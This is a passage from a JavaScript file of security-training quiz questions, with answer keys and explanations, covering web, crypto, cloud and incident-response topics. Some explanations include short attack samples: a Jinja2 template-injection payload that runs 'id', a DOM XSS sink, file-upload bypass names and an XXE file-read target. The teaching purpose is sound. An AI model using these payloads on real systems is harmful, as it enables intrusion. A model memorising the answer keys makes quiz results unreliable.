      { q: 'What is the difference between a hub and a switch from a security perspective?', opts: ['Hubs encrypt traffic, switches don\'t', 'Switches forward traffic only to the destination port, hubs broadcast to all ports', 'Hubs support VLANs, switches don\'t', 'Switches are wireless, hubs are wired'], correct: 1, difficulty: 'beginner', explain: 'A hub broadcasts all traffic to every connected port, meaning any device can sniff all network traffic (making packet capture trivial). A switch learns MAC addresses and forwards frames only to the specific port where the destination device is connected, significantly reducing the ability to passively sniff traffic. However, switches can still be attacked via MAC flooding, ARP spoofing, or port mirroring. Reference: Network fundamentals.' },
      { q: 'What is a MAC flooding attack?', opts: ['Spoofing MAC addresses to bypass NAC', 'Overflowing a switch\'s CAM table to make it act like a hub', 'Flooding a network with multicast frames', 'Overwhelming a MAC address filter'], correct: 1, difficulty: 'intermediate', explain: 'MAC flooding overwhelms a switch\'s Content Addressable Memory (CAM) table with thousands of fake MAC addresses. When the CAM table is full, the switch can no longer learn new MAC-to-port mappings and falls back to hub-like behavior, broadcasting frames to all ports. This allows the attacker to sniff all traffic on the switch. Defense: port security limiting MAC addresses per port. Reference: CISCO Port Security.' },
    ],
  },
  {
    id: 'pr-web', name: 'Web Security', color: '#a78bfa',
    questions: [
      { q: 'What is the most effective defense against SQL injection?', opts: ['Input validation with regex', 'Parameterized queries / prepared statements', 'Web Application Firewall (WAF)', 'Escaping special characters'], correct: 1, difficulty: 'beginner', explain: 'Parameterized queries (prepared statements) are the most effective defense because they separate SQL code from data. The database treats user input as data values, never as SQL commands, regardless of the content. While WAFs and input validation provide defense-in-depth, they can be bypassed. Escaping is error-prone and not recommended as a primary defense. Reference: OWASP SQL Injection Prevention.' },
      { q: 'What is a Stored XSS attack?', opts: ['XSS payload stored in a cookie', 'Malicious script permanently stored on the target server and served to other users', 'XSS that exploits local storage APIs', 'A cached XSS payload in the browser'], correct: 1, difficulty: 'beginner', explain: 'Stored (Persistent) XSS occurs when malicious script is permanently stored on the target server (e.g., in a database, comment field, or forum post) and served to other users who view the affected page. Unlike Reflected XSS which requires the victim to click a crafted link, Stored XSS attacks every user who views the infected content, making it more dangerous. Reference: OWASP XSS Prevention.' },
      { q: 'What HTTP header prevents clickjacking attacks?', opts: ['X-Content-Type-Options', 'Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security'], correct: 2, difficulty: 'intermediate', explain: 'X-Frame-Options prevents clickjacking by controlling whether a page can be embedded in an iframe. Values: DENY (never framed), SAMEORIGIN (only by same origin), ALLOW-FROM (specific origin, deprecated). CSP\'s frame-ancestors directive is the modern replacement. Clickjacking tricks users into clicking hidden UI elements overlaid with transparent iframes. Reference: RFC 7034.' },
      { q: 'What is Server-Side Request Forgery (SSRF)?', opts: ['Forging HTTP responses from the server', 'Tricking the server into making requests to unintended locations', 'Spoofing the server\'s SSL certificate', 'Injecting malicious server-side code'], correct: 1, difficulty: 'intermediate', explain: 'SSRF occurs when an attacker can make the server-side application send HTTP requests to an attacker-chosen destination. This can be used to access internal services, cloud metadata endpoints (169.254.169.254), or scan internal networks. The Capital One breach (2019) exploited SSRF to access AWS metadata and steal 100M+ records. Defense: URL allowlisting, disable unnecessary URL schemes, network segmentation. Reference: OWASP SSRF, CWE-918.' },
      { q: 'What does the SameSite cookie attribute prevent?', opts: ['Cookie theft via XSS', 'Cross-site request forgery (CSRF)', 'Session fixation', 'Cookie poisoning'], correct: 1, difficulty: 'intermediate', explain: 'The SameSite cookie attribute prevents CSRF by controlling when cookies are sent in cross-site requests. SameSite=Strict never sends cookies cross-site. SameSite=Lax sends cookies only with top-level navigations (GET). SameSite=None sends cookies cross-site but requires Secure flag. Modern browsers default to Lax when no SameSite is set. Reference: RFC 6265bis.' },
      { q: 'What is the purpose of Content-Security-Policy (CSP)?', opts: ['Encrypt HTTP content', 'Define which content sources the browser should trust', 'Set content encoding for compression', 'Enforce content access control lists'], correct: 1, difficulty: 'intermediate', explain: 'CSP is an HTTP header that tells the browser which sources of content (scripts, styles, images, fonts, etc.) are trusted for the current page. It mitigates XSS by preventing inline scripts and restricting script sources to allowlisted domains. Example: script-src \'self\' cdn.example.com prevents scripts from any other source. CSP can also prevent data exfiltration via connect-src. Reference: MDN CSP, CWE-79.' },
      { q: 'What is an IDOR vulnerability?', opts: ['Insecure Direct Object Reference — accessing objects by manipulating identifiers', 'Internal Domain Object Restriction bypass', 'Indirect Data Object Redirection attack', 'Insecure Default Object Routing'], correct: 0, difficulty: 'beginner', explain: 'IDOR (Insecure Direct Object Reference) occurs when an application exposes internal object references (database IDs, filenames) in URLs or parameters without proper authorization checks. An attacker can manipulate these references to access other users\' data. Example: changing /api/user/123/profile to /api/user/124/profile to access another user\'s profile. Defense: authorization checks on every request, indirect references. Reference: OWASP IDOR, CWE-639.' },
      { q: 'What makes DOM-based XSS different from Reflected XSS?', opts: ['DOM XSS uses cookies, Reflected uses URL parameters', 'DOM XSS payload never reaches the server — it\'s processed entirely in the browser', 'DOM XSS only affects Internet Explorer', 'DOM XSS requires authentication'], correct: 1, difficulty: 'advanced', explain: 'DOM-based XSS occurs when client-side JavaScript processes untrusted data (from the URL hash, document.referrer, postMessage, etc.) and writes it to the DOM without sanitization. The malicious payload never reaches the server — the entire vulnerability is in the client-side code. This makes it invisible to server-side WAFs and log analysis. Example: document.getElementById(\'output\').innerHTML = location.hash.slice(1). Reference: OWASP DOM XSS, CWE-79.' },
      { q: 'What is the purpose of a CSRF token?', opts: ['Encrypt form data', 'Prove the request originated from the legitimate application', 'Authenticate the user\'s identity', 'Prevent SQL injection in forms'], correct: 1, difficulty: 'beginner', explain: 'A CSRF (Cross-Site Request Forgery) token is a unique, unpredictable value generated server-side and embedded in forms. When the form is submitted, the server verifies the token matches the one it issued. Since an attacker on a different origin cannot read the token, they cannot forge a valid request. Tokens should be per-session or per-request, cryptographically random, and tied to the user\'s session. Reference: OWASP CSRF Prevention.' },
      { q: 'What is the security risk of using eval() in JavaScript?', opts: ['It slows down page rendering', 'It can execute arbitrary code from untrusted input, leading to XSS/RCE', 'It breaks Content Security Policy', 'It disables the browser\'s same-origin policy'], correct: 1, difficulty: 'intermediate', explain: 'eval() executes a string as JavaScript code. If any part of that string comes from user input, URL parameters, cookies, or other untrusted sources, an attacker can inject arbitrary code. This leads to XSS in browsers or RCE in server-side JavaScript (Node.js). Even indirect eval (new Function(), setTimeout with string argument) has the same risk. CSP script-src without \'unsafe-eval\' blocks eval. Reference: CWE-95.' },
      { q: 'What is HTTP request smuggling?', opts: ['Hiding malicious payloads in HTTP headers', 'Exploiting discrepancies in how front-end and back-end servers parse HTTP requests', 'Tunneling non-HTTP traffic inside HTTP requests', 'Sending HTTP requests over non-standard ports'], correct: 1, difficulty: 'advanced', explain: 'HTTP request smuggling exploits differences in how front-end (reverse proxy/load balancer) and back-end servers determine where one HTTP request ends and the next begins. By crafting ambiguous requests (using conflicting Content-Length and Transfer-Encoding headers), an attacker can \'smuggle\' a second request inside the first, potentially bypassing security controls, poisoning caches, or hijacking other users\' requests. Reference: PortSwigger Research.' },
      { q: 'What is the purpose of Subresource Integrity (SRI)?', opts: ['Verify the integrity of external resources loaded by a web page', 'Enforce same-origin policy for subresources', 'Encrypt resources in transit', 'Compress resources for faster loading'], correct: 0, difficulty: 'intermediate', explain: 'SRI allows browsers to verify that resources fetched from CDNs or third-party origins haven\'t been tampered with. The HTML tag includes a cryptographic hash of the expected content: <script src=\'cdn.js\' integrity=\'sha384-...\' crossorigin=\'anonymous\'>. If the fetched content doesn\'t match the hash, the browser refuses to execute it. This protects against compromised CDNs or supply chain attacks. Reference: MDN SRI, W3C SRI.' },
      { q: 'What is a race condition vulnerability in web applications?', opts: ['A bug caused by CSS animation timing', 'A flaw where the outcome depends on the timing of concurrent operations', 'A vulnerability in WebSocket race detection', 'An error in JavaScript event loop handling'], correct: 1, difficulty: 'advanced', explain: 'Race conditions occur when the outcome of an operation depends on the timing of concurrent events. In web apps, this can allow: double-spending (withdrawing money twice before balance updates), bypassing rate limits (sending requests simultaneously), coupon reuse, or TOCTOU (time-of-check-to-time-of-use) authorization bypasses. Defense: database transactions, advisory locks, idempotency keys, atomic operations. Reference: CWE-362, PortSwigger Race Conditions.' },
      { q: 'What is the primary risk of allowing file uploads without proper validation?', opts: ['Increased storage costs', 'Remote Code Execution via uploaded web shells', 'Slow page loading', 'Database corruption'], correct: 1, difficulty: 'intermediate', explain: 'Unrestricted file upload is critical because attackers can upload web shells (PHP, JSP, ASPX) that execute server-side code. Even with extension checks, bypasses exist: double extensions (shell.php.jpg), null bytes (shell.php%00.jpg), content-type manipulation, and .htaccess overrides. Defense: allowlist extensions, validate content type AND magic bytes, store outside web root, rename files, scan for malware. Reference: OWASP Unrestricted File Upload, CWE-434.' },
      { q: 'What does HSTS (HTTP Strict Transport Security) enforce?', opts: ['HTTP/2 protocol usage', 'HTTPS-only connections for the domain', 'Strong cipher suite selection', 'Certificate pinning'], correct: 1, difficulty: 'beginner', explain: 'HSTS tells browsers to only connect to the site via HTTPS, even if the user types http:// or clicks an HTTP link. The Strict-Transport-Security header sets a max-age during which the browser automatically upgrades all requests to HTTPS. The includeSubDomains directive covers all subdomains. HSTS preloading embeds the policy in browser source code, protecting even the first visit. Reference: RFC 6797.' },
      { q: 'What is Server-Side Template Injection (SSTI)?', opts: ['Injecting HTML templates into the DOM', 'Exploiting template engines to execute server-side code', 'Modifying email templates stored on the server', 'Injecting CSS into server-rendered pages'], correct: 1, difficulty: 'advanced', explain: 'SSTI occurs when user input is embedded directly into a server-side template (Jinja2, Twig, Freemarker, Velocity, etc.) and processed by the template engine. Since template engines often have access to the server\'s runtime environment, this can lead to Remote Code Execution. Example in Jinja2: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}. Defense: never pass user input directly into templates, use sandboxed template engines. Reference: PortSwigger SSTI, CWE-1336.' },
      { q: 'What is the Same-Origin Policy (SOP)?', opts: ['A server-side access control mechanism', 'A browser security mechanism that restricts how documents from one origin can interact with resources from another origin', 'A DNS policy preventing zone transfers', 'A TLS certificate validation rule'], correct: 1, difficulty: 'intermediate', explain: 'SOP is a fundamental browser security mechanism. It restricts scripts from one origin (scheme + host + port) from reading data from a different origin. For example, JavaScript on evil.com cannot read responses from bank.com. SOP does not prevent sending requests (which is why CSRF works), only reading responses. CORS (Cross-Origin Resource Sharing) headers allow servers to selectively relax SOP. Reference: MDN Same-Origin Policy.' },
      { q: 'What is a JWT (JSON Web Token) algorithm confusion attack?', opts: ['Using weak encryption algorithms', 'Tricking the server into using a symmetric algorithm (HS256) with the public key as the secret', 'Confusing base64 and base64url encoding', 'Mixing up JWT header and payload'], correct: 1, difficulty: 'advanced', explain: 'JWT algorithm confusion exploits servers that accept both RS256 (asymmetric) and HS256 (symmetric). The attacker takes the server\'s public key (which is often publicly available), creates a token signed with HS256 using the public key as the HMAC secret. If the server uses the public key for both RS256 verification and HS256 HMAC checking, the forged token is accepted. Defense: explicitly specify and validate the expected algorithm server-side. Reference: Auth0 JWT Vulnerabilities, CWE-327.' },
      { q: 'What is XML External Entity (XXE) injection?', opts: ['Injecting XML tags into HTML pages', 'Exploiting XML parsers to read local files, perform SSRF, or cause denial of service', 'Modifying XML schema definitions', 'Injecting external CSS into XML documents'], correct: 1, difficulty: 'intermediate', explain: 'XXE exploits XML parsers that process external entity declarations. An attacker crafts XML with a DTD defining an external entity pointing to a local file (file:///etc/passwd) or internal URL. When the parser processes the entity, it reads the file/URL and includes the content in the response. This can lead to file disclosure, SSRF, or DoS (billion laughs attack). Defense: disable DTD processing and external entities in the XML parser. Reference: OWASP XXE, CWE-611.' },
      { q: 'What is prototype pollution in JavaScript?', opts: ['Memory leak in the prototype chain', 'Injecting properties into Object.prototype that affect all objects', 'Corrupting the JavaScript engine\'s prototype cache', 'Overloading constructor functions'], correct: 1, difficulty: 'advanced', explain: 'Prototype pollution occurs when an attacker can inject properties into Object.prototype (or other built-in prototypes) through unsafe object merging, deep clone, or parameter parsing. Since all JavaScript objects inherit from Object.prototype, the injected property appears on every object. This can lead to XSS, authentication bypass, RCE in Node.js (via child_process options), or DoS. Example: merging {__proto__: {isAdmin: true}} into a user object. Reference: CWE-1321, Snyk Prototype Pollution.' },
    ],
  },
  {
    id: 'pr-crypto', name: 'Cryptography', color: '#f472b6',
    questions: [
      { q: 'What is the key difference between symmetric and asymmetric encryption?', opts: ['Symmetric is faster, asymmetric is slower', 'Symmetric uses one key for both operations, asymmetric uses a key pair', 'Symmetric is for files, asymmetric is for network traffic', 'Symmetric is unbreakable, asymmetric can be broken'], correct: 1, difficulty: 'beginner', explain: 'Symmetric encryption uses the same key for encryption and decryption (AES, ChaCha20). Asymmetric uses a key pair — public key for encryption, private key for decryption (RSA, ECC). Symmetric is ~1000x faster but requires secure key exchange. In practice, TLS uses asymmetric to exchange a symmetric session key, then symmetric for bulk data encryption (hybrid approach). Reference: NIST SP 800-175B.' },
      { q: 'Why is ECB (Electronic Codebook) mode considered insecure?', opts: ['It\'s too slow for modern hardware', 'Identical plaintext blocks produce identical ciphertext blocks, revealing patterns', 'It doesn\'t use an initialization vector', 'It only works with DES, not AES'], correct: 1, difficulty: 'intermediate', explain: 'ECB mode encrypts each block independently with the same key. This means identical plaintext blocks always produce identical ciphertext blocks, preserving patterns in the data. The classic demonstration is the ECB penguin — encrypting a bitmap image with ECB mode clearly shows the penguin outline in the ciphertext. Use CBC, CTR, or GCM mode instead. Reference: NIST SP 800-38A.' },
      { q: 'What is a hash collision?', opts: ['When two different inputs produce the same hash output', 'When a hash function produces an error', 'When two hash functions produce the same result', 'When a hash is computed twice on the same input'], correct: 0, difficulty: 'beginner', explain: 'A hash collision occurs when two different inputs produce the same hash value. While collisions are theoretically inevitable (pigeonhole principle), cryptographic hash functions are designed to make finding collisions computationally infeasible. MD5 and SHA-1 are broken — practical collision attacks exist. SHA-256 and SHA-3 are currently collision-resistant. Collisions can be exploited to forge digital signatures or certificates. Reference: SHAttered attack (SHA-1).' },
      { q: 'What is a padding oracle attack?', opts: ['Exploiting error messages to decrypt data one byte at a time', 'Attacking the random padding in RSA', 'Exploiting buffer overflow in padding functions', 'Brute-forcing encryption padding'], correct: 0, difficulty: 'advanced', explain: 'A padding oracle attack exploits a server that reveals whether the padding of a decrypted ciphertext is valid (via different error messages, timing, or behavior). By manipulating ciphertext bytes and observing responses, an attacker can decrypt the entire message one byte at a time without knowing the key. Affects CBC mode with PKCS#7 padding. The POODLE attack exploited this in SSLv3. Defense: use authenticated encryption (GCM), constant-time padding validation. Reference: Vaudenay 2002, CVE-2014-3566 POODLE.' },
      { q: 'What is Perfect Forward Secrecy (PFS)?', opts: ['Guaranteeing messages cannot be replayed', 'Ensuring session keys cannot be compromised even if the server\'s long-term private key is later compromised', 'Encrypting messages so they can only be read once', 'Using quantum-resistant algorithms'], correct: 1, difficulty: 'intermediate', explain: 'PFS ensures that compromising a server\'s long-term private key doesn\'t compromise past session keys. This is achieved by using ephemeral Diffie-Hellman (DHE or ECDHE) key exchange — a new key pair is generated for each session and discarded after. Without PFS (using RSA key exchange), an attacker who records encrypted traffic and later steals the private key can decrypt all past sessions. Reference: RFC 8446 (TLS 1.3).' },
      { q: 'Why should you never use MD5 for password hashing?', opts: ['MD5 produces hashes that are too short', 'MD5 is too fast, enabling rapid brute force, and has known collision vulnerabilities', 'MD5 is not supported by modern operating systems', 'MD5 requires too much memory'], correct: 1, difficulty: 'beginner', explain: 'MD5 is unsuitable for password hashing for two reasons: 1) It\'s extremely fast (~10 billion hashes/second on a GPU), making brute force and dictionary attacks trivial. 2) It has known collision and preimage vulnerabilities. Password hashing requires deliberately slow algorithms: bcrypt, scrypt, or Argon2. These include configurable work factors, salting, and memory-hardness to resist GPU/ASIC attacks. Reference: OWASP Password Storage, CWE-328.' },
      { q: 'What is the purpose of a salt in password hashing?', opts: ['Make the hash longer and harder to brute force', 'Prevent identical passwords from producing identical hashes, defeating rainbow tables', 'Add encryption on top of hashing', 'Replace the need for a pepper'], correct: 1, difficulty: 'beginner', explain: 'A salt is a unique random value prepended to each password before hashing. This ensures that even if two users have the same password, their stored hashes are different. Salts defeat precomputed attacks (rainbow tables) because the attacker would need a separate table for each possible salt value. Salts are stored alongside the hash (they don\'t need to be secret). Each password must have its own unique salt. Reference: OWASP Password Storage.' },
      { q: 'What is the Diffie-Hellman key exchange vulnerable to?', opts: ['Brute force attacks', 'Man-in-the-middle attacks (without authentication)', 'Side-channel attacks only', 'Quantum computing only'], correct: 1, difficulty: 'intermediate', explain: 'Basic Diffie-Hellman establishes a shared secret over an insecure channel but provides no authentication. A man-in-the-middle can intercept and establish separate DH exchanges with each party, relaying modified messages between them. Defense: authenticate the DH exchange using digital signatures (as done in TLS), certificates, or pre-shared keys. Authenticated DH (like ECDHE in TLS 1.3) is not vulnerable to MITM. Reference: RFC 7919.' },
      { q: 'What key length is recommended for RSA in 2024+?', opts: ['1024 bits', '2048 bits minimum, 3072+ recommended', '512 bits', '4096 bits mandatory'], correct: 1, difficulty: 'beginner', explain: 'NIST recommends a minimum of 2048-bit RSA keys, with 3072 bits recommended for security beyond 2030. 1024-bit RSA is considered broken and should never be used. 4096-bit keys provide the highest security but with performance trade-offs. For better performance with equivalent security, consider ECDSA/EdDSA with 256-bit curves (equivalent to ~3072-bit RSA). Reference: NIST SP 800-57.' },
      { q: 'What is AES-GCM?', opts: ['A key exchange protocol', 'An authenticated encryption mode combining AES-CTR encryption with GMAC authentication', 'A hash function based on AES', 'A digital signature algorithm'], correct: 1, difficulty: 'intermediate', explain: 'AES-GCM (Galois/Counter Mode) provides authenticated encryption with associated data (AEAD). It combines CTR mode encryption for confidentiality with GMAC for integrity and authenticity, in a single pass. GCM is the most widely used AEAD mode in TLS 1.3. It requires a unique nonce (IV) for each encryption — nonce reuse is catastrophic (allows key recovery). GCM is hardware-accelerated on modern CPUs (AES-NI). Reference: NIST SP 800-38D.' },
      { q: 'What is a digital certificate used for?', opts: ['Encrypting files on disk', 'Binding a public key to an identity, verified by a Certificate Authority', 'Storing passwords securely', 'Generating random numbers'], correct: 1, difficulty: 'beginner', explain: 'A digital certificate (X.509) binds a public key to an identity (domain name, organization) and is signed by a trusted Certificate Authority (CA). The certificate contains: subject, public key, issuer (CA), validity period, serial number, and the CA\'s digital signature. Browsers trust a set of root CAs; if a site\'s certificate chains to a trusted root, the browser trusts the site\'s public key for TLS. Reference: RFC 5280.' },
      { q: 'What cryptographic attack does quantum computing threaten most?', opts: ['Symmetric encryption (AES)', 'Asymmetric encryption (RSA, ECC) via Shor\'s algorithm', 'Hash functions (SHA-256)', 'Random number generation'], correct: 1, difficulty: 'advanced', explain: 'Shor\'s algorithm on a sufficiently powerful quantum computer can factor large numbers and compute discrete logarithms in polynomial time, breaking RSA, DSA, ECDSA, and DH. Symmetric algorithms are less affected — Grover\'s algorithm halves the effective key length (AES-256 → 128-bit security, still safe). NIST has standardized post-quantum algorithms: CRYSTALS-Kyber (key exchange) and CRYSTALS-Dilithium (signatures) for the transition to quantum-resistant cryptography. Reference: NIST PQC, FIPS 203/204/205.' },
      { q: 'What is the purpose of HMAC?', opts: ['Hash-based encryption', 'Verify both integrity and authenticity of a message using a shared secret key', 'Generate random MAC addresses', 'Compress messages for efficient storage'], correct: 1, difficulty: 'intermediate', explain: 'HMAC (Hash-based Message Authentication Code) combines a cryptographic hash function with a secret key to produce a MAC that verifies both the integrity (message hasn\'t been modified) and authenticity (message came from someone who knows the key) of a message. HMAC-SHA256 is widely used in API authentication, JWT signing, and secure cookie verification. Unlike a plain hash, only parties with the secret key can generate or verify the HMAC. Reference: RFC 2104.' },
      { q: 'What is key stretching and why is it important?', opts: ['Making encryption keys longer for more security', 'Applying a hash function thousands of times to slow down brute force attacks on passwords', 'Stretching the key schedule in AES', 'Extending RSA key pairs for multiple uses'], correct: 1, difficulty: 'intermediate', explain: 'Key stretching applies a hash function iteratively (thousands to millions of times) to make password-based key derivation deliberately slow. This dramatically increases the time needed for brute force attacks. PBKDF2 uses a configurable iteration count, bcrypt uses a cost factor, scrypt adds memory requirements, and Argon2 adds both time and memory parameters. A single hash takes microseconds; 100,000 iterations takes ~100ms, making large-scale cracking impractical. Reference: NIST SP 800-132.' },
      { q: 'What is the birthday attack in cryptography?', opts: ['An attack that only works on certain dates', 'Exploiting the birthday paradox to find hash collisions faster than brute force', 'Attacking systems based on the user\'s date of birth', 'A social engineering technique using birthday information'], correct: 1, difficulty: 'advanced', explain: 'The birthday attack exploits the birthday paradox: in a group of 23 people, there\'s a 50% chance two share a birthday. Applied to hash functions: finding a collision requires approximately 2^(n/2) attempts for an n-bit hash, not 2^n. For MD5 (128-bit), a collision requires ~2^64 operations, not 2^128. This is why hash functions need output sizes at least twice the desired security level. SHA-256 provides 128-bit collision resistance. Reference: Applied Cryptography, Schneier.' },
    ],
  },
  {
    id: 'pr-cloud', name: 'Cloud Security', color: '#60a5fa',
    questions: [
      { q: 'What is the AWS Instance Metadata Service (IMDS) and why is it a security concern?', opts: ['A service for managing EC2 instance types', 'An HTTP endpoint (169.254.169.254) that provides instance credentials and can be exploited via SSRF', 'A DNS service for EC2 instance naming', 'A logging service for instance activities'], correct: 1, difficulty: 'intermediate', explain: 'IMDS is an HTTP endpoint at 169.254.169.254 that provides EC2 instances with metadata, including temporary IAM credentials. If an application on the instance is vulnerable to SSRF, an attacker can query IMDS to steal IAM credentials. IMDSv1 is a simple GET request; IMDSv2 requires a PUT request with a token (hop limit 1), significantly reducing SSRF exploitation. The Capital One breach (2019) exploited IMDSv1 via SSRF. Reference: AWS IMDS Documentation, Capital One Breach 2019.' },
      { q: 'What is the Shared Responsibility Model in cloud security?', opts: ['Cloud provider and customer share the cost of security tools', 'Cloud provider secures the infrastructure; customer secures their data, applications, and configurations', 'Both provider and customer have identical security responsibilities', 'Customer is responsible for everything including physical security'], correct: 1, difficulty: 'beginner', explain: 'The Shared Responsibility Model defines that the cloud provider (AWS, Azure, GCP) is responsible for security OF the cloud (physical infrastructure, hypervisor, network, facilities), while the customer is responsible for security IN the cloud (data, IAM, OS patching, application security, network configuration, encryption). The division varies by service type: IaaS gives customers more responsibility than PaaS or SaaS. Reference: AWS Shared Responsibility.' },
      { q: 'What is a cloud security posture management (CSPM) tool?', opts: ['A tool for managing cloud costs', 'A tool that continuously monitors cloud configurations for security misconfigurations and compliance violations', 'A cloud-based antivirus solution', 'A tool for managing cloud user identities'], correct: 1, difficulty: 'intermediate', explain: 'CSPM tools continuously assess cloud environments for security misconfigurations, compliance violations, and security risks. They check IAM policies, network configurations, encryption settings, logging, and publicly exposed resources against best practices and compliance frameworks (CIS Benchmarks, PCI DSS, SOC 2). Examples: AWS Security Hub, Azure Defender, GCP Security Command Center, Prisma Cloud, Wiz, Orca. Reference: Gartner CSPM.' },
      { q: 'What is the principle of least privilege in IAM?', opts: ['Give users the minimum permissions needed to perform their job functions', 'Create the fewest number of user accounts possible', 'Use the simplest authentication method available', 'Grant admin access only to the IT department'], correct: 0, difficulty: 'beginner', explain: 'Least privilege means granting users, services, and applications only the minimum permissions required to perform their specific tasks — nothing more. In cloud IAM, this means: avoid wildcard (*) permissions, use condition keys to restrict scope, prefer managed policies over inline, regularly review and revoke unused permissions, use temporary credentials (IAM roles) over long-lived access keys, and implement just-in-time access for elevated privileges. Reference: NIST SP 800-53 AC-6.' },
      { q: 'What is a service mesh and how does it improve security?', opts: ['A network of microservices connected via message queues', 'An infrastructure layer that handles service-to-service communication with built-in mTLS, observability, and policy enforcement', 'A cloud firewall service', 'A mesh VPN connecting cloud regions'], correct: 1, difficulty: 'advanced', explain: 'A service mesh (Istio, Linkerd, Consul Connect) is a dedicated infrastructure layer for handling service-to-service communication in microservices architectures. Security benefits: automatic mutual TLS (mTLS) between services without code changes, fine-grained authorization policies, traffic encryption, and observability. It moves security from the application layer to the infrastructure layer, ensuring consistent enforcement. Reference: NIST SP 800-204A.' },
      { q: 'What is container image scanning?', opts: ['Scanning container files for viruses', 'Analyzing container images for known vulnerabilities in OS packages and application dependencies', 'Monitoring running containers for intrusions', 'Scanning container registries for unauthorized access'], correct: 1, difficulty: 'intermediate', explain: 'Container image scanning analyzes the layers of a container image to identify known vulnerabilities (CVEs) in OS packages, application libraries, and dependencies. It should be integrated into CI/CD pipelines (shift-left) and container registries. Tools: Trivy, Grype, Snyk Container, Clair, Prisma Cloud. Best practices: scan in CI/CD, scan in registry, scan running images, enforce policies that block deployment of images with critical vulnerabilities. Reference: NIST SP 800-190.' },
      { q: 'What is Infrastructure as Code (IaC) security scanning?', opts: ['Scanning physical infrastructure for vulnerabilities', 'Analyzing Terraform/CloudFormation templates for security misconfigurations before deployment', 'Monitoring infrastructure performance', 'Scanning network infrastructure for open ports'], correct: 1, difficulty: 'intermediate', explain: 'IaC security scanning analyzes infrastructure definitions (Terraform, CloudFormation, Pulumi, ARM templates, Kubernetes manifests) for security misconfigurations BEFORE they are deployed. This is a shift-left approach that catches issues like: publicly accessible S3 buckets, unencrypted databases, overly permissive security groups, missing logging, and non-compliant configurations. Tools: Checkov, tfsec, KICS, Bridgecrew, Snyk IaC. Reference: OWASP IaC Security.' },
      { q: 'What is the purpose of AWS GuardDuty?', opts: ['Manage AWS firewall rules', 'Intelligent threat detection service that monitors for malicious activity and unauthorized behavior', 'Encrypt data at rest in AWS services', 'Manage SSL certificates for AWS resources'], correct: 1, difficulty: 'intermediate', explain: 'AWS GuardDuty is a managed threat detection service that continuously monitors AWS accounts and workloads for malicious activity. It analyzes CloudTrail logs, VPC Flow Logs, and DNS logs using machine learning, anomaly detection, and threat intelligence. It detects: compromised instances, unauthorized access, cryptocurrency mining, data exfiltration, privilege escalation, and reconnaissance. Findings are categorized by severity and can trigger automated remediation via EventBridge. Reference: AWS GuardDuty Documentation.' },
      { q: 'What is a cloud access security broker (CASB)?', opts: ['A cloud-based VPN provider', 'A security policy enforcement point between cloud consumers and cloud providers', 'A cloud identity provider', 'A cloud storage encryption service'], correct: 1, difficulty: 'intermediate', explain: 'A CASB sits between users and cloud services to enforce security policies. Four pillars: 1) Visibility — discover all cloud services in use (shadow IT). 2) Compliance — ensure cloud usage meets regulatory requirements. 3) Data Security — DLP, encryption, tokenization for cloud data. 4) Threat Protection — detect and prevent malicious activity in cloud services. Deployment modes: proxy (forward/reverse), API, or log-based. Examples: Netskope, Zscaler, Microsoft Defender for Cloud Apps. Reference: Gartner CASB.' },
      { q: 'What is a Kubernetes Pod Security Standard?', opts: ['A standard for pod naming conventions', 'Three security profiles (Privileged, Baseline, Restricted) that define security requirements for pods', 'A standard for pod resource limits', 'A pod networking standard'], correct: 1, difficulty: 'advanced', explain: 'Kubernetes Pod Security Standards define three profiles: 1) Privileged — unrestricted (for system-level workloads). 2) Baseline — minimally restrictive, prevents known privilege escalations (blocks hostNetwork, hostPID, privileged containers). 3) Restricted — heavily restricted, follows security best practices (blocks root, requires read-only root filesystem, drops all capabilities). Enforced via Pod Security Admission (PSA) controller at namespace level. Replaced the deprecated PodSecurityPolicy (PSP). Reference: Kubernetes Pod Security Standards.' },
    ],
  },
  {
    id: 'pr-ir', name: 'Incident Response', color: '#fb923c',
    questions: [
      { q: 'What are the four phases of the NIST SP 800-61 Rev 2 Incident Response lifecycle?', opts: ['Detect, Analyze, Contain, Eradicate, Recover, Learn', 'Preparation; Detection & Analysis; Containment, Eradication & Recovery; Post-Incident Activity', 'Alert, Triage, Investigate, Remediate, Close, Report', 'Monitor, Identify, Protect, Detect, Respond, Recover'], correct: 1, difficulty: 'beginner', explain: 'NIST SP 800-61 Rev 2 defines four phases: 1) Preparation — tools, training, playbooks. 2) Detection & Analysis — identify and confirm incidents. 3) Containment, Eradication & Recovery — limit damage, remove the threat, and restore systems to normal operations. 4) Post-Incident Activity — lessons learned, documentation, process improvement. (The six-step PICERL model, which splits containment, eradication and recovery apart, is the SANS model.) These phases are not strictly linear — teams may iterate between containment, eradication, and recovery. Reference: NIST SP 800-61 Rev 2.' },
      { q: 'What is the first thing you should do when you discover a potentially compromised system?', opts: ['Immediately shut it down', 'Disconnect it from the network but keep it powered on to preserve volatile evidence', 'Reimage the system', 'Run antivirus scan'], correct: 1, difficulty: 'intermediate', explain: 'Preserving evidence is critical. Power off destroys volatile memory contents (running processes, network connections, logged-in users, encryption keys, malware in memory). Instead: disconnect from network (unplug cable or disable NIC) to prevent further damage and C2 communication, but keep powered on. Document everything. Capture a memory dump before any other action. Then image the disk. This follows the order of volatility principle. Reference: NIST SP 800-86.' },
      { q: 'What is the order of volatility in digital forensics?', opts: ['Hard drive → RAM → Network connections → CPU registers', 'CPU registers → RAM → Network connections → Hard drive → Backups', 'Network logs → System logs → Application logs → User files', 'Encrypted data → Compressed data → Raw data → Metadata'], correct: 1, difficulty: 'intermediate', explain: 'The order of volatility (RFC 3227) lists evidence from most volatile to least: 1) CPU registers and cache. 2) RAM (running processes, network connections, encryption keys). 3) Network state (routing tables, ARP cache, active connections). 4) Running processes. 5) Disk (file system, swap). 6) Remote logging and monitoring data. 7) Physical configuration. 8) Archival media and backups. Evidence should be collected in this order because the most volatile data is lost first. Reference: RFC 3227.' },
      { q: 'What is a chain of custody in digital forensics?', opts: ['The encryption chain used to secure evidence', 'A documented chronological record of who handled the evidence, when, and what was done', 'The authorization chain for accessing evidence', 'The sequence of tools used to analyze evidence'], correct: 1, difficulty: 'beginner', explain: 'Chain of custody is a complete, documented record of everyone who handled a piece of evidence, when they received and transferred it, what they did with it, and how it was stored. It ensures evidence integrity and admissibility in legal proceedings. Breaking the chain (gaps in documentation, unauthorized access) can render evidence inadmissible in court. Use evidence bags, hash verification, write blockers, and detailed logs. Reference: NIST SP 800-86.' },
